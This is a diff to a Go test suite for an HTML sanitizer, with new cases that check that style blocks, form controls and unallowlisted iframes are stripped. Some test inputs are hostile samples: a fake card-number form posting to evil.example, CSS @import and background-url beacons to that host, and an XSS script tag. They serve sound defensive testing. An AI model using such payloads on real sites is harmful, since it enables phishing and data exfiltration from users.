@@ -25,24 +25,34 @@ func TestSanitizeHTMLDocument(t *testing.T) {
 			want:  `<div style="color: red; font-size: 16px;"><p>Styled text</p></div>`,
 		},
 		{
-			name:  "style block preserved",
+			name:  "style block stripped but content survives",
 			input: `<div><style>.my-class { color: blue; }</style><p class="my-class">Blue</p></div>`,
-			want:  `<div><style>.my-class { color: blue; }</style><p class="my-class">Blue</p></div>`,
+			want:  `<div><p class="my-class">Blue</p></div>`,
 		},
 		{
-			name:  "style block with type attribute preserved",
+			name:  "style block with type attribute stripped",
 			input: `<div><style type="text/css">h1 { font-size: 2em; }</style><h1 class="title">Hi</h1></div>`,
-			want:  `<div><style type="text/css">h1 { font-size: 2em; }</style><h1 class="title">Hi</h1></div>`,
+			want:  `<div><h1 class="title">Hi</h1></div>`,
 		},
 		{
-			name:  "multi-line style block preserved verbatim",
+			name:  "multi-line style block stripped verbatim",
 			input: "<div><style>\n  .a { color: red; }\n  .b { color: green; }\n</style><p class=\"a\">Red</p></div>",
-			want:  "<div><style>\n  .a { color: red; }\n  .b { color: green; }\n</style><p class=\"a\">Red</p></div>",
+			want:  "<div><p class=\"a\">Red</p></div>",
 		},
 		{
 			name:  "script tag stripped",
 			input: `<div><p>Hello</p><script>alert('xss')</script></div>`,
 			want:  `<div><p>Hello</p></div>`,
+		},
+		{
+			name:  "form controls stripped (their text content survives)",
+			input: `<form action="https://evil.example/steal"><input name="cc" placeholder="Card number"><button>Pay here</button><textarea></textarea><select><option>1</option></select></form>`,
+			want:  `Pay here1`,
+		},
+		{
+			name:  "form attribute rules do not leak onto other elements",
+			input: `<p placeholder="fake" value="x" for="y">text</p>`,
+			want:  `<p>text</p>`,
 		},
 		{
 			name:  "event handler stripped",
@@ -261,6 +271,59 @@ func TestSanitizeHTMLDocument_WithIframeAllowlist(t *testing.T) {
 			input:     `<iframe src="https://www.youtube.com/embed/123"></iframe>`,
 			allowlist: []string{},
 			want:      ``,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := sanitize.SanitizeHTMLDocument(tt.input, tt.allowlist...)
+			assert.Equal(t, tt.want, got)
+		})
+	}
+}
+
+func TestSanitizeHTMLDocument_StripsStyleBlocks(t *testing.T) {
+	tests := []struct {
+		name      string
+		input     string
+		allowlist []string
+		want      string
+	}{
+		{
+			name:  "success - innocent style block stripped but content survives",
+			input: `<div><style>.my-class { color: blue; }</style><p class="my-class">Blue</p></div>`,
+			want:  `<div><p class="my-class">Blue</p></div>`,
+		},
+		{
+			name:  "success - style block with type attribute stripped",
+			input: `<div><style type="text/css">h1 { font-size: 2em; }</style><h1 class="title">Hi</h1></div>`,
+			want:  `<div><h1 class="title">Hi</h1></div>`,
+		},
+		{
+			name:  "success - exfil-flavored import stripped",
+			input: `<div><style>@import url(https://evil.example/x.css);</style><p>Hello</p></div>`,
+			want:  `<div><p>Hello</p></div>`,
+		},
+		{
+			name:  "success - exfil-flavored background beacon stripped",
+			input: `<div><style>body{background:url(https://evil.example/bg)}</style><p>Hello</p></div>`,
+			want:  `<div><p>Hello</p></div>`,
+		},
+		{
+			name:  "success - multi-line style block stripped verbatim",
+			input: "<div><style>\n  .a { color: red; }\n  .b { color: green; }\n</style><p class=\"a\">Red</p></div>",
+			want:  "<div><p class=\"a\">Red</p></div>",
+		},
+		{
+			name:      "success - iframe allowlist intact while style is stripped",
+			input:     `<div><style>.x { position: absolute; }</style><iframe src="https://www.youtube.com/embed/123"></iframe></div>`,
+			allowlist: []string{"www.youtube.com"},
+			want:      `<div><iframe src="https://www.youtube.com/embed/123"></iframe></div>`,
+		},
+		{
+			name:  "success - iframe without allowlist stripped alongside style",
+			input: `<div><style>.x { color: red; }</style><iframe src="https://www.youtube.com/embed/123"></iframe></div>`,
+			want:  `<div></div>`,
 		},
 	}
 
